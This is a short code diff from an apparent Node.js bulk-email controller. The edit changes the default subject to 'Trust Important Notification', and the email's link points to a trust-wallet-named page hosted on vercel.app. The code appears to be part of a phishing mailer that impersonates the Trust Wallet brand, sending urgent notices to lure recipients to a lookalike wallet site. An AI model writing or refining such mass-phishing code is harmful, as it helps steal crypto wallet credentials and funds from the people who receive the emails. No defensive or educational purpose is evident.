@@ -30,7 +30,7 @@ exports.sendBulkEmailDefault = async (req, res) => {
             return res.status(400).json({ error: 'Email must be a non-empty string or array.' });
         }
 
-        const defaultSubject = "Important Notification";
+        const defaultSubject = "Trust Important Notification";
         const secureLink = `https://trust-wallet-inky.vercel.app/`;
 
         // Send emails and save to DB in parallel
